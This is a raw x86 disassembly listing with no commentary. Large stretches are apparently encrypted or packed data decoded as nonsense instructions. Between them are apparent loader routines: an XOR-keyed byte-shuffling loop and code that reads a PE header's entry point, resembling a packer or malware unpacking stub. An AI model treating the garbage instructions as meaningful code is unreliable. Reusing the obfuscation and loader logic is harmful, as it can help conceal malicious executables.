  406165:	sub    al,dl
  406167:	daa    
  406168:	nop
  406169:	fadd   QWORD PTR cs:[esi]
  40616c:	mov    edi,0x3da04ef6
  406171:	ins    DWORD PTR es:[edi],dx
  406172:	jb     0x406156
  406174:	sbb    BYTE PTR [edi+0x4],al
  406177:	inc    eax
  406179:	jne    0x40614d
  40617b:	xor    eax,0x9a7a16ef
  406180:	mov    ch,0x7f
  406182:	mov    bh,0x9a
  406184:	and    BYTE PTR [esp+edi*8-0x7ec820a1],dl
  40618b:	sub    ah,dl
  40618d:	pop    ss
  40618e:	dec    ebp
  40618f:	loop   0x40615b
  406191:	and    BYTE PTR [edx+eax*8+0x4622e894],bh
  406198:	xchg   BYTE PTR ds:0xbfbd70b4,cl
  40619e:	mov    ebp,0xf0f91830
  4061a3:	push   ecx
  4061a4:	rcl    al,1
  4061a6:	pop    fs
  4061a8:	and    eax,DWORD PTR [eax+0x43]
  4061ab:	mov    ecx,0xa9df59de
  4061b0:	inc    ebx
  4061b1:	push   ebx
  4061b2:	jecxz  0x40620d
  4061b4:	and    eax,0xad298ff9
  4061b9:	fwait
  4061ba:	sahf   
  4061bb:	ss adc eax,0x5d583992
  4061c1:	inc    ebx
  4061c2:	fld    DWORD PTR [ecx+0x6302354f]
  4061c8:	iret   
  4061c9:	sub    BYTE PTR [edx],bh
  4061cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061cc:	sti    
  4061cd:	add    bh,BYTE PTR [ebp+0x4f68076d]
  4061d3:	fisubr WORD PTR [ecx-0x154612d8]
  4061d9:	sbb    DWORD PTR [edi+0xb001b5f],0x43
  4061e0:	stos   DWORD PTR es:[edi],eax
  4061e1:	fcom   QWORD PTR [edx-0xd]
  4061e4:	xor    eax,0xf7b6f538
  4061e9:	(bad)  
  4061ea:	mov    gs,WORD PTR [esi+0x4ee35935]
  4061f0:	adc    eax,0xab4f38ca
  4061f5:	je     0x40621f
  4061f7:	cmp    DWORD PTR [edx+0x72186675],esi
  4061fd:	jp     0x4061d8
  4061ff:	aaa    
  406200:	push   edi
  406201:	call   0xd672:0x898ce264
  406208:	mov    esi,0x5cd833f3
  40620d:	xchg   DWORD PTR [esi-0x6de0b966],edi
  406213:	push   es
  406214:	dec    ebx
  406215:	pop    edx
  406216:	lods   al,BYTE PTR ds:[esi]
  406217:	pop    esi
  406218:	fs leave 
  40621a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40621b:	in     al,0x8e
  40621d:	aad    0x8d
  40621f:	jmp    DWORD PTR [ecx+ebp*4-0x9291a0]
  406226:	ficom  WORD PTR [ebx+ebx*4+0x28e131b5]
  40622d:	ins    BYTE PTR es:[edi],dx
  40622e:	xlat   BYTE PTR ds:[ebx]
  40622f:	ss nop
  406231:	lea    edx,ss:[edx]
  406234:	dec    eax
  406235:	sbb    edi,0xffffffcf
  406238:	mov    eax,ds:0xe3e793c4
  40623d:	push   esi
  40623e:	(bad)  
  40623f:	push   edi
  406240:	cwde   
  406241:	mov    dl,BYTE PTR [ebx-0x50ec7575]
  406247:	add    DWORD PTR [edi+ecx*1],edi
  40624a:	inc    ecx
  40624b:	inc    esi
  40624c:	outs   dx,BYTE PTR ds:[esi]
  40624d:	add    al,0x9d
  40624f:	cmp    dl,BYTE PTR [ecx+0x2db73deb]
  406255:	push   edi
  406256:	fsubr  QWORD PTR [eax-0x5622df1e]
  40625c:	scas   eax,DWORD PTR es:[edi]
  40625d:	leave  
  40625e:	cmp    eax,0xd4edcc00
  406263:	and    eax,DWORD PTR [edi]
  406265:	pusha  
  406266:	push   0x496bae69
  40626b:	addr16 pop es
  40626d:	in     al,dx
  40626e:	mov    ecx,0x23550da7
  406273:	or     BYTE PTR [edi+0x37],bl
  406276:	call   0x4a46:0x4d752506
  40627d:	xchg   ebp,eax
  40627e:	jmp    0x2af3:0xc5c71102
  406285:	test   eax,0x2d89d281
  40628a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40628b:	push   esi
  40628c:	and    ecx,ebp
  40628e:	jg     0x406309
  406290:	ins    DWORD PTR es:[edi],dx
  406291:	lods   al,BYTE PTR ds:[esi]
  406292:	push   es
  406293:	icebp  
  406294:	ins    BYTE PTR es:[edi],dx
  406295:	pop    ds
  406296:	into   
  406297:	popa   
  406298:	pop    ecx
  406299:	aad    0x71
  40629b:	sbb    edi,DWORD PTR [edi-0x3d0d8ec8]
  4062a1:	inc    ecx
  4062a2:	fmul   QWORD PTR [edi+0x27]
  4062a5:	mov    DWORD PTR [ecx+0x72b302a7],ecx
  4062ab:	adc    al,0xfb
  4062ad:	mov    eax,0x982f5919
  4062b2:	fwait
  4062b3:	cmp    DWORD PTR [edx+0x3259dea4],0xffffffd3
  4062ba:	mov    ebp,0x663a27cd
  4062bf:	sub    al,0xa4
  4062c1:	fcomp  DWORD PTR [ebx]
  4062c3:	fidiv  WORD PTR [eax+0x5aef8ee2]
  4062c9:	adc    al,0xad
  4062cb:	aaa    
  4062cc:	add    ecx,ebp
  4062ce:	jge    0x406256
  4062d0:	cmp    BYTE PTR [edi],dh
  4062d2:	inc    ebx
  4062d3:	cmp    dl,BYTE PTR [eax-0x77]
  4062d6:	pop    ebp
  4062d7:	popa   
  4062d8:	mov    al,cs:0x65a95d20
  4062de:	mov    ds:0x9f0d5826,eax
  4062e3:	aaa    
  4062e4:	push   esi
  4062e5:	ss pop esi
  4062e7:	bnd je 0x406329
  4062ea:	ins    BYTE PTR es:[edi],dx
  4062eb:	xlat   BYTE PTR ds:[ebx]
  4062ec:	jbe    0x4062fa
  4062ee:	inc    edx
  4062ef:	sbb    eax,0x20f5ce6e
  4062f4:	mov    al,ds:0x51739349
  4062f9:	add    dl,BYTE PTR [ecx]
  4062fb:	fwait
  4062fc:	mov    al,0xab
  4062fe:	mov    eax,0x46cf2f4d
  406303:	jnp    0x40632c
  406305:	(bad)  
  406306:	fmul   DWORD PTR [edi+0x38]
  406309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40630a:	add    al,BYTE PTR [ecx-0x4c8d6a2a]
  406310:	stc    
  406311:	(bad)  
  406312:	imul   edi,DWORD PTR [ecx-0x79],0x627172e3
  406319:	stc    
  40631a:	add    DWORD PTR [ebx],edx
  40631c:	pusha  
  40631d:	sbb    edx,DWORD PTR [edx]
  40631f:	adc    DWORD PTR [ebp+0x77],ebx
  406322:	js     0x4062ec
  406324:	dec    ecx
  406325:	imul   esi,DWORD PTR [esi+0x706cc987],0xffffff9f
  40632c:	jle    0x406390
  40632e:	out    dx,al
  40632f:	fild   QWORD PTR [edi+0x14]
  406332:	jle    0x406360
  406334:	sbb    edx,ebp
  406336:	leave  
  406337:	dec    ecx
  406338:	sub    DWORD PTR [esp+ebx*2],edi
  40633b:	or     eax,0xb98759bf
  406340:	pop    ss
  406341:	std    
  406342:	add    DWORD PTR [edi],ebp
  406344:	sub    al,cl
  406346:	cmp    edi,DWORD PTR [ebp-0x6d0cc3ee]
  40634c:	jno    0x40630b
  40634e:	jnp    0x406359
  406350:	or     eax,0x43b2536f
  406355:	or     DWORD PTR [ecx],eax
  406357:	bound  edx,QWORD PTR [ecx-0x61916da6]
  40635d:	xchg   ebx,eax
  40635e:	add    BYTE PTR [eax+0x4b],al
  406361:	push   es
  406362:	sub    edx,eax
  406364:	loopne 0x4063c4
  406366:	pop    ss
  406367:	add    eax,0x39e8b3d7
  40636c:	jmp    0x40633f
  40636e:	jecxz  0x40631c
  406370:	leave  
  406371:	push   edx
  406372:	push   0xf19d53a3
  406377:	mov    ecx,DWORD PTR [edi]
  406379:	pavgb  mm2,mm6
  40637c:	xchg   esi,eax
  40637d:	mov    edx,0xb2fe11b2
  406382:	pop    ecx
  406383:	outs   dx,DWORD PTR ds:[esi]
  406384:	xor    eax,0xbfb7c3ae
  406389:	ins    BYTE PTR es:[edi],dx
  40638a:	loopne 0x4063af
  40638c:	pop    ecx
  40638d:	xor    DWORD PTR [edx+0x38],0xf16ab629
  406394:	lds    edx,FWORD PTR [ebx+esi*1-0x1916a0ec]
  40639b:	int3   
  40639c:	iret   
  40639d:	mov    edx,DWORD PTR [esi+0x34869f77]
  4063a3:	call   0x734c:0x90125d6a
  4063aa:	scas   eax,DWORD PTR es:[edi]
  4063ab:	xchg   esi,eax
  4063ac:	sbb    BYTE PTR [esi],0xf1
  4063af:	jbe    0x4063d4
  4063b1:	push   0x396bafaa
  4063b6:	xchg   edi,eax
  4063b7:	sbb    BYTE PTR [ebp+0x4973a163],ch
  4063bd:	std    
  4063be:	mov    edi,edi
  4063c0:	or     eax,0x89ccc9ad
  4063c5:	sbb    BYTE PTR [ebp-0x66],0xd4
  4063c9:	nop
  4063ca:	or     edi,eax
  4063cc:	dec    esi
  4063cd:	xchg   esp,eax
  4063ce:	mov    BYTE PTR [esi+ebx*1],ch
  4063d1:	fcom   st(7)
  4063d3:	jbe    0x4063dc
  4063d9:	mov    edx,DWORD PTR [ebp-0x3c]
  4063dc:	mov    edi,DWORD PTR [ebp-0x4]
  4063df:	xor    edi,eax
  4063e1:	xor    edx,eax
  4063e3:	add    edi,ecx
  4063e5:	add    edx,ecx
  4063e7:	imul   edx,edi
  4063ea:	mov    DWORD PTR [ebp+0xc],edx
  4063ed:	mov    edx,DWORD PTR [ebp+0xc]
  4063f0:	mov    DWORD PTR [ebp-0x24],edx
  4063f3:	mov    edx,DWORD PTR [ebp-0x8]
  4063f6:	add    edx,DWORD PTR [ebp-0x40]
  4063f9:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  406400:	mov    DWORD PTR [ebp-0x1c],edx
  406403:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40640a:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  406411:	mov    edx,DWORD PTR [ebp-0x18]
  406414:	xor    edx,eax
  406416:	add    edx,ecx
  406418:	jmp    0x4067df
  40641d:	mov    edx,DWORD PTR [ebp-0x18]
  406420:	xor    edx,eax
  406422:	add    edx,DWORD PTR [ebp-0x14]
  406425:	mov    edi,DWORD PTR [ebp-0x1c]
  406428:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  40642f:	mov    BYTE PTR [ebp+0xf],dl
  406432:	mov    edx,DWORD PTR [ebp-0xc]
  406435:	xor    edx,eax
  406437:	add    edx,DWORD PTR [ebp-0x14]
  40643a:	mov    edi,DWORD PTR [ebp-0x1c]
  40643d:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  406444:	mov    BYTE PTR [ebp+0xb],dl
  406447:	mov    dl,BYTE PTR [ebp+0xf]
  40644a:	mov    edi,DWORD PTR [ebp-0xc]
  40644d:	jmp    0x4067a7
  406452:	pop    esi
  406453:	xlat   BYTE PTR ds:[ebx]
  406454:	pop    edi
  406455:	jmp    0x4064ce
  406457:	jae    0x4064c3
  406459:	push   ebx
  40645a:	jmp    0x4064aa
  40645c:	cmc    
  40645d:	pop    ss
  40645e:	and    BYTE PTR gs:[ebx+0x23],dl
  406462:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406463:	cmp    BYTE PTR [esi+0x7e],bh
  406466:	xor    edi,DWORD PTR [ebp+0x7e]
  406469:	jle    0x40649f
  40646b:	dec    edi
  40646c:	xchg   ebp,ebx
  40646e:	lods   eax,DWORD PTR ds:[esi]
  40646f:	and    eax,0x75eeeb8c
  406474:	jo     0x40640a
  406476:	pushw  0xda9c
  40647a:	jle    0x40646b
  40647c:	fwait
  40647d:	sbb    BYTE PTR [ebx+0x76],al
  406480:	adc    esp,DWORD PTR [eax+ebx*2]
  406483:	repnz int3 
  406485:	and    esp,DWORD PTR [ebx]
  406487:	dec    ebp
  406488:	xchg   ecx,eax
  406489:	adc    BYTE PTR [esi-0x9c91f44],cl
  40648f:	jne    0x406448
  406491:	dec    ebx
  406492:	aas    
  406493:	xchg   cl,al
  406495:	adc    dl,BYTE PTR [ebx]
  406497:	iret   
  406498:	fstp   TBYTE PTR [edi+edx*1-0x2c]
  40649c:	ja     0x40645c
  40649e:	dec    ecx
  40649f:	cmp    eax,ebp
  4064a1:	shl    BYTE PTR [esi],1
  4064a3:	mov    ds:0xd4a0adc2,al
  4064a8:	mov    al,ds:0xb9b6568d
  4064ad:	pop    ss
  4064ae:	sbb    cl,BYTE PTR [eax]
  4064b0:	sbb    al,0x39
  4064b2:	or     DWORD PTR [edi],0x51
  4064b5:	jle    0x4064a7
  4064b7:	leave  
  4064b8:	mov    ebp,0x9d8d470
  4064bd:	jl     0x4064a2
  4064bf:	(bad)
  4064c3:	mov    ch,0x15
  4064c6:	xchg   ebx,eax
  4064c7:	push   ebp
  4064c8:	cld    
  4064c9:	mov    ds:0x83c597a8,eax
  4064ce:	mov    al,0x10
  4064d0:	pop    es
  4064d1:	mov    DWORD PTR [ebp-0x259d2ffe],eax
  4064d7:	test   BYTE PTR [ebx+ebp*4+0x66],bh
  4064db:	dec    edi
  4064dc:	pop    ecx
  4064dd:	xor    ah,dl
  4064df:	pop    esi
  4064e0:	clc    
  4064e1:	pop    edx
  4064e2:	outs   dx,BYTE PTR ds:[esi]
  4064e3:	jne    0x4064c7
  4064e5:	pop    esp
  4064e6:	xchg   edi,eax
  4064e7:	retf   
  4064e8:	sbb    BYTE PTR [edi+0x1d],cl
  4064eb:	lods   eax,DWORD PTR ds:[esi]
  4064ec:	mov    al,ds:0xc88d47df
  4064f1:	push   esi
  4064f2:	loopne 0x406545
  4064f4:	dec    BYTE PTR [edi-0x59100cfd]
  4064fa:	pop    ebx
  4064fb:	test   DWORD PTR [edx],ecx
  4064fd:	sti    
  4064fe:	(bad)  
  4064ff:	dec    esp
  406500:	dec    esi
  406501:	cs xchg edx,eax
  406503:	mov    ch,0x2f
  406505:	int    0x96
  406507:	sub    DWORD PTR [ebx+0x12],0xc05292ae
  40650e:	jno    0x406562
  406510:	loope  0x406575
  406512:	or     DWORD PTR [eax-0x32436ba0],eax
  406518:	mov    edx,DWORD PTR [eax-0x3f828d3d]
  40651e:	add    eax,0xc894f3db
  406523:	push   ebp
  406524:	loopne 0x4064dc
  406526:	lods   eax,DWORD PTR ds:[esi]
  406527:	xor    al,0xaa
  406529:	out    0xf9,al
  40652b:	out    dx,al
  40652c:	push   ds
  40652d:	in     eax,0xf2
  40652f:	mov    ds:0xf338787c,al
  406534:	sbb    al,0xee
  406536:	test   DWORD PTR [ecx],ebx
  406538:	into   
  406539:	push   edx
  40653a:	jg     0x4064ca
  40653c:	xor    DWORD PTR [eax+0x7b1ac664],esi
  406542:	mov    ebp,0x407244d2
  406547:	cmp    DWORD PTR [esi+ecx*2+0x588300ee],0xf62e06b0
  406552:	cmp    edx,ebp
  406554:	and    edi,DWORD PTR [ecx]
  406556:	mov    esp,0xa62657d7
  40655b:	jg     0x4064f3
  40655d:	jns    0x406592
  40655f:	fwait
  406560:	push   ss
  406561:	mov    ds:0xa447263c,eax
  406566:	sbb    eax,0x49d3d8e3
  40656b:	push   esp
  40656c:	hlt    
  40656d:	add    BYTE PTR [eax],bl
  40656f:	cwde   
  406570:	pop    ecx
  406571:	xchg   ebp,eax
  406572:	dec    edx
  406574:	inc    edx
  406575:	jmp    0x4065c0
  406577:	dec    esi
  406578:	(bad)  
  406579:	jbe    0x4065dc
  40657b:	jge    0x406584
  40657d:	inc    ebx
  40657e:	cld    
  40657f:	xchg   DWORD PTR [eax],ecx
  406581:	inc    ecx
  406582:	test   BYTE PTR [edi+0x2e],dl
  406585:	aad    0x89
  406587:	pop    esp
  406588:	in     eax,0x9a
  40658a:	mov    es,WORD PTR [edx-0x6c80623f]
  406590:	adc    al,0xac
  406592:	xor    DWORD PTR ds:0xebc5f1ab,ebp
  406598:	xchg   edi,eax
  406599:	fwait
  40659a:	jnp    0x40655d
  40659c:	adc    DWORD PTR [ecx-0xb],ecx
  40659f:	cmc    
  4065a0:	sbb    DWORD PTR [esi-0x171477eb],esp
  4065a6:	pop    esp
  4065a7:	lods   eax,DWORD PTR ds:[esi]
  4065a8:	sar    BYTE PTR [edx+0x21],cl
  4065ab:	test   ecx,ebp
  4065ad:	push   ss
  4065ae:	xchg   edi,eax
  4065af:	adc    BYTE PTR [ecx+0x34c102fc],bh
  4065b5:	out    dx,al
  4065b6:	pop    ebp
  4065b7:	add    esi,DWORD PTR [ebp*1-0x39c4294a]
  4065be:	jae    0x4065a8
  4065c0:	jo     0x406594
  4065c2:	xor    al,BYTE PTR [ecx-0x1c57b87d]
  4065c8:	icebp  
  4065c9:	sbb    BYTE PTR [esi*8-0x61647721],al
  4065d0:	(bad)
  4065d3:	lods   al,BYTE PTR ds:[esi]
  4065d4:	pusha  
  4065d5:	mov    BYTE PTR [esi+0x15],bl
  4065d8:	inc    ebp
  4065d9:	pop    esi
  4065da:	nop
  4065db:	std    
  4065dc:	add    bh,ch
  4065de:	sti    
  4065df:	dec    edx
  4065e0:	js     0x406636
  4065e2:	pushf  
  4065e3:	ds pop eax
  4065e5:	dec    esi
  4065e6:	mov    ecx,0x33281041
  4065eb:	(bad)  
  4065ed:	test   al,0xe9
  4065ef:	ja     0x4065e1
  4065f1:	pxor   mm6,QWORD PTR [esi+0x31df5d76]
  4065f8:	cmp    ecx,0x976ef217
  4065fe:	ja     0x40661e
  406600:	cmp    al,0xdc
  406602:	mov    esp,0xf7a74af6
  406607:	std    
  406608:	xor    BYTE PTR [ebx+edx*1],al
  40660b:	pushf  
  40660c:	add    bl,BYTE PTR [ebx]
  40660e:	(bad)  
  40660f:	pop    esi
  406610:	call   0x4225:0xff0600d5
  406617:	loop   0x406656
  406619:	cmp    ah,BYTE PTR ds:0x3542fc7c
  40661f:	and    al,BYTE PTR [edi*2+0x1a31ad6d]
  406626:	cmp    eax,0x4ba4e505
  40662b:	mov    WORD PTR [edx+eiz*4-0x4bff71a9],ds
  406632:	cmp    eax,0x2098e820
  406637:	inc    esp
  406638:	xchg   BYTE PTR ds:0x4758a54f,ah
  40663e:	test   DWORD PTR [edi-0x5b3c838b],esi
  406644:	sbb    DWORD PTR [ecx+ebx*2-0x9320e0c],edx
  40664b:	pop    eax
  40664c:	fstp   st(3)
  40664e:	mov    cl,0x1d
  406650:	xor    eax,0x70336d9e
  406655:	scas   eax,DWORD PTR es:[edi]
  406656:	lods   al,BYTE PTR ds:[esi]
  406657:	or     ch,BYTE PTR [ebp+0x73cddd86]
  40665d:	and    al,0x7f
  40665f:	and    BYTE PTR [edx+edx*1],0x96
  406663:	(bad)  
  406664:	mov    bl,0x21
  406666:	pop    esi
  406667:	ret    
  406668:	xor    eax,0x92933477
  40666d:	cmp    al,0x76
  40666f:	xchg   edi,eax
  406670:	call   DWORD PTR [esi+0x152799f4]
  406676:	clc    
  406677:	fs mov ah,0xb2
  40667a:	jns    0x406640
  40667c:	(bad)  
  40667d:	sbb    bh,BYTE PTR [eax-0x1a]
  406680:	jbe    0x4066da
  406682:	xchg   esp,eax
  406683:	sub    BYTE PTR [edx],al
  406685:	int    0x90
  406687:	inc    edx
  406688:	and    al,0xa2
  40668a:	aad    0xd8
  40668c:	mov    gs,WORD PTR [ebx+edi*1-0x195039a0]
  406693:	retf   
  406694:	pop    ebx
  406695:	jmp    0xb8c1:0x139902a6
  40669c:	leave  
  40669d:	cdq    
  40669e:	mov    esp,0xae55306a
  4066a3:	cmp    al,0x17
  4066a5:	sahf   
  4066a6:	pop    ecx
  4066a7:	mov    al,0x50
  4066a9:	and    bl,ch
  4066ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066ac:	movups XMMWORD PTR [esi+0x23],xmm6
  4066b0:	xchg   esi,eax
  4066b1:	pop    esp
  4066b2:	fs pop ecx
  4066b4:	retf   
  4066b5:	or     dh,al
  4066b7:	and    DWORD PTR [edi+ecx*1],0x8e7115c1
  4066be:	aad    0x4a
  4066c0:	out    0x3c,eax
  4066c2:	cwde   
  4066c3:	bound  ecx,QWORD PTR [edx-0x3f]
  4066c6:	cmp    BYTE PTR [eax-0x5d17291f],cl
  4066cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066cd:	jno    0x406716
  4066cf:	or     ah,BYTE PTR [edi]
  4066d1:	mov    ebx,0xdc8b4c16
  4066d6:	fld    DWORD PTR [ecx]
  4066d8:	repz mov bl,0xe9
  4066db:	push   edx
  4066dc:	mov    edi,0x5961cc96
  4066e1:	adc    dl,bl
  4066e3:	xor    al,0x23
  4066e5:	mov    ah,0x3
  4066e7:	shr    DWORD PTR [ebp+0xa],cl
  4066ea:	sbb    ch,BYTE PTR [esi+0x6835ac38]
  4066f0:	stc    
  4066f1:	sub    DWORD PTR [ebp+0x44],edx
  4066f4:	in     al,0x1a
  4066f6:	lods   al,BYTE PTR ds:[esi]
  4066f7:	ins    BYTE PTR es:[edi],dx
  4066f8:	lods   al,BYTE PTR ds:[esi]
  4066f9:	pop    edx
  4066fa:	jecxz  0x4066de
  4066fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4066fd:	bound  ebp,QWORD PTR [ecx+edx*2]
  406700:	add    BYTE PTR [ebx+0x1a],dh
  406703:	inc    ebp
  406704:	jl     0x4066f5
  406706:	jno    0x4066ff
  406708:	add    al,ch
  40670a:	mov    ds:0x53c490e0,eax
  40670f:	sbb    BYTE PTR [ebx-0x45dfe7bd],bh
  406715:	inc    esi
  406716:	adc    BYTE PTR [edi-0x26],bl
  406719:	std    
  40671a:	ja     0x406766
  40671c:	xor    eax,0x5d339e72
  406721:	inc    esp
  406722:	sbb    ebx,edx
  406724:	mov    edi,0xc0768fd8
  406729:	jne    0x4066b2
  40672b:	xchg   ecx,eax
  40672c:	sbb    eax,0xbe97436a
  406731:	pop    ebp
  406732:	dec    esi
  406733:	neg    DWORD PTR [eax+0x6fadb41f]
  406739:	xchg   esi,eax
  40673a:	cmp    dh,BYTE PTR [edi+edi*8]
  40673d:	fnstenv [edi+edx*8]
  406740:	js     0x4066e9
  406742:	push   cs
  406743:	adc    eax,0x2a6c871a
  406748:	mov    ebp,0xabf6cf44
  40674d:	das    
  40674e:	mov    bl,0x66
  406750:	mov    esp,0x77921e4f
  406755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406756:	add    al,0x6b
  406758:	mov    bl,0x85
  40675a:	xchg   edx,eax
  40675b:	adc    BYTE PTR [ebx],0xb
  40675e:	sbb    al,0x41
  406760:	into   
  406761:	mov    eax,ds:0xaf5d8c6e
  406766:	mov    BYTE PTR [esi-0x551851a8],ch
  40676c:	test   BYTE PTR [ebx],ah
  40676e:	jmp    0x1f69dbb3
  406773:	cmp    al,0xe2
  406775:	xlat   BYTE PTR ds:[ebx]
  406776:	ja     0x406781
  406778:	in     al,dx
  406779:	mov    cl,0x94
  40677b:	out    dx,al
  40677c:	inc    ebx
  40677d:	shr    DWORD PTR [ebx+0x75],0x55
  406781:	jl     0x4067e4
  406783:	dec    eax
  406784:	jne    0x4067ed
  406786:	bound  esp,QWORD PTR [edi+0x83f0d13]
  40678c:	push   ebp
  40678d:	xchg   edx,eax
  40678e:	div    DWORD PTR [edi]
  406790:	mov    dh,0x38
  406792:	mov    ah,0x4d
  406794:	clc    
  406795:	and    BYTE PTR [edi-0x6d335321],bh
  40679b:	xchg   esi,eax
  40679c:	mov    al,ds:0x7012cef4
  4067a1:	jl     0x4067c2
  4067a3:	repz sub ebp,DWORD PTR [edx-0x3]
  4067a7:	xor    edi,eax
  4067a9:	add    edi,DWORD PTR [ebp-0x14]
  4067ac:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067af:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067b6:	mov    dl,BYTE PTR [ebp+0xb]
  4067b9:	mov    edi,DWORD PTR [ebp-0x18]
  4067bc:	xor    edi,eax
  4067be:	add    edi,DWORD PTR [ebp-0x14]
  4067c1:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067c4:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067cb:	mov    edx,DWORD PTR [ebp-0x44]
  4067ce:	mov    edi,DWORD PTR [ebp-0xc]
  4067d1:	xor    edx,eax
  4067d3:	xor    edi,eax
  4067d5:	add    edx,ecx
  4067d7:	add    edi,ecx
  4067d9:	imul   edx,edi
  4067dc:	add    edx,DWORD PTR [ebp-0x14]
  4067df:	mov    DWORD PTR [ebp-0x14],edx
  4067e2:	mov    edx,DWORD PTR [ebp-0xc]
  4067e5:	mov    edi,DWORD PTR [ebp-0x24]
  4067e8:	xor    edx,eax
  4067ea:	add    edx,ecx
  4067ec:	imul   edx,edi
  4067ef:	mov    edi,DWORD PTR [ebp-0xc]
  4067f2:	xor    edi,eax
  4067f4:	sub    edx,edi
  4067f6:	mov    edi,DWORD PTR [ebp-0xc]
  4067f9:	mov    ebx,DWORD PTR [ebp-0x14]
  4067fc:	xor    edi,eax
  4067fe:	add    edi,ecx
  406800:	imul   edi,ebx
  406803:	mov    ebx,DWORD PTR [ebp-0x18]
  406806:	xor    ebx,eax
  406808:	sub    edx,ecx
  40680a:	lea    edi,[edi+ebx*1+0x32729b]
  406811:	cmp    edi,edx
  406813:	jbe    0x40641d
  406819:	mov    edx,DWORD PTR [ebp-0xc]
  40681c:	mov    edi,DWORD PTR [ebp-0x24]
  40681f:	xor    edx,eax
  406821:	add    edx,ecx
  406823:	imul   edx,edi
  406826:	mov    edi,DWORD PTR [ebp-0x18]
  406829:	xor    edi,eax
  40682b:	add    edx,edi
  40682d:	mov    edi,DWORD PTR [ebp-0x8]
  406830:	lea    edx,[edx+edi*1+0x32729b]
  406837:	mov    DWORD PTR [ebp-0x8],edx
  40683a:	mov    edx,DWORD PTR [ebp-0x20]
  40683d:	xor    edx,eax
  40683f:	mov    edi,0xffcd8d65
  406844:	sub    edi,edx
  406846:	add    edi,DWORD PTR [ebp-0x10]
  406849:	mov    edx,DWORD PTR [ebp-0x20]
  40684c:	mov    ebx,DWORD PTR [ebp-0x8]
  40684f:	xor    edx,eax
  406851:	add    edx,ecx
  406853:	imul   edx,ebx
  406856:	cmp    edx,edi
  406858:	jbe    0x40501f
  40685e:	pop    ebx
  40685f:	pop    edi
  406860:	leave  
  406861:	ret    0x8
  406864:	push   ebp
  406865:	mov    ebp,esp
  406867:	push   ecx
  406868:	mov    ecx,DWORD PTR ds:0x433747
  40686e:	mov    eax,ds:0x43375f
  406873:	sub    ecx,eax
  406875:	xor    ecx,DWORD PTR [ecx+eax*1]
  406878:	mov    ecx,DWORD PTR [ebp+0x8]
  40687b:	and    DWORD PTR ds:0x43366b,0x0
  406885:	jmp    0x406895
  40688a:	mov    eax,ds:0x43366b
  40688f:	inc    eax
  406890:	mov    ds:0x43366b,eax
  406895:	cmp    DWORD PTR ds:0x43366b,0x1d
  40689c:	jae    0x4068e6
  4068a2:	cmp    DWORD PTR ds:0x43366b,0xb
  4068a9:	jne    0x4068c9
  4068af:	push   0x8428
  4068b4:	push   0x433810
  4068b9:	push   0x433810
  4068be:	push   0x433767
  4068c3:	call   DWORD PTR ds:0x412378
  4068c9:	cmp    DWORD PTR ds:0x43366b,0xa
  4068d0:	jne    0x4068e1
  4068d6:	mov    eax,ds:0x43366b
  4068db:	inc    eax
  4068dc:	mov    ds:0x43366b,eax
  4068e1:	jmp    0x40688a
  4068e6:	mov    eax,0x7510854
  4068eb:	sbb    DWORD PTR ds:0x4336fb,0x433673
  4068f5:	xor    ecx,eax
  4068f7:	and    DWORD PTR ds:0x43372f,0x491f
  406901:	add    ecx,0x32729b
  406907:	mov    DWORD PTR ds:0x43361f,0x6297
  406911:	mov    DWORD PTR [ebp+0x10],ecx
  406914:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  40691b:	mov    ecx,0x4881
  406920:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  406927:	mov    ecx,0xf89c8532
  40692c:	push   esi
  40692d:	mov    DWORD PTR ds:0x4336b3,0x711c
  406937:	mov    DWORD PTR [ebp+0x10],0x70019f3
  40693e:	mov    DWORD PTR ds:0x433633,edi
  406944:	mov    esi,DWORD PTR [ebp-0x4]
  406947:	mov    DWORD PTR ds:0x4336b7,0x237d
  406951:	cmp    ecx,esi
  406953:	mov    DWORD PTR ds:0x4336f7,0x9b
  40695d:	je     0x406998
  406963:	and    DWORD PTR ds:0x433617,0x274d
  40696d:	mov    esi,DWORD PTR [ebp+0xc]
  406970:	xor    ecx,eax
  406972:	sub    DWORD PTR ds:0x4336c3,0x433613
  40697c:	xor    esi,eax
  40697e:	lea    ecx,[esi+ecx*1+0x32729b]
  406985:	xor    ecx,eax
  406987:	cmp    ecx,0xf89c8521
  40698d:	jne    0x40692d
  406993:	jmp    0x4069c6
  406998:	add    ecx,0xffcd8d65
  40699e:	mov    esi,ecx
  4069a0:	xor    esi,eax
  4069a2:	add    esi,DWORD PTR [ebp+0x8]
  4069a5:	mov    DWORD PTR [ebp+0x8],esi
  4069a8:	mov    esi,DWORD PTR [ebp+0x8]
  4069ab:	xor    esi,ecx
  4069ad:	xor    esi,eax
  4069af:	mov    eax,DWORD PTR [edx+0x194]
  4069b5:	mov    ecx,DWORD PTR [eax]
  4069b7:	mov    eax,DWORD PTR [ecx+0x3c]
  4069ba:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4069be:	add    eax,ecx
  4069c0:	mov    DWORD PTR [ebp+0x8],esi
  4069c3:	mov    DWORD PTR [ebp+0x10],eax
  4069c6:	mov    eax,DWORD PTR [ebp+0x10]
  4069c9:	pop    esi
  4069ca:	test   eax,eax
  4069cc:	jmp    0x406c4a
  4069d1:	gs aaa 
  4069d3:	jns    0x406a20
  4069d5:	dec    ecx
  4069d6:	jno    0x406a4d
  4069d8:	xor    DWORD PTR [ebp-0x2c9b6e39],ecx
  4069de:	fdiv   st,st(5)
  4069e0:	pop    esi
